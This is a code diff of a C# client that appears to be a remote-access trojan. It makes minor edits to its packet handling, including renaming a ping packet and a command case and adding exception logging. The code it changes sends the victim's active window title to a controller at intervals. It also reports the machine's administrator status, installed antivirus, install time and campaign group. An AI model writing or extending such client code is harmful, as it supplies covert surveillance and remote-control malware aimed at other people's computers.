@@ -122,8 +122,9 @@ namespace Client
                     return;
                 }
             }
-            catch
+            catch(Exception ex)
             {
+                Debug.WriteLine(ex.Message);
                 IsConnected = false;
                 return;
             }
@@ -244,7 +245,7 @@ namespace Client
             try
             {
                 MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Packet").AsString = "ClientPing";
                 msgpack.ForcePathObject("Message").AsString = GetActiveWindowTitle();
                 Send(msgpack.Encode2Bytes());
                 GC.Collect();
@@ -322,7 +323,7 @@ namespace Client
                             break;
                         }
 
-                    case "Controler":
+                    case "Command":
                         {
                             MessageBox.Show("123");
                             break;
@@ -377,7 +378,7 @@ namespace Client
             msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
             msgpack.ForcePathObject("Active").AsString = GetActiveWindowTitle();
             msgpack.ForcePathObject("AV").AsString = GetAV();
-            msgpack.ForcePathObject("Install-Type").AsInteger = 0;//GetInstallType();
+            msgpack.ForcePathObject("Install-Type").AsString = "0";//GetInstallType();
             msgpack.ForcePathObject("Install-Time").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
             msgpack.ForcePathObject("Group").AsString = Group;
             return msgpack.Encode2Bytes();
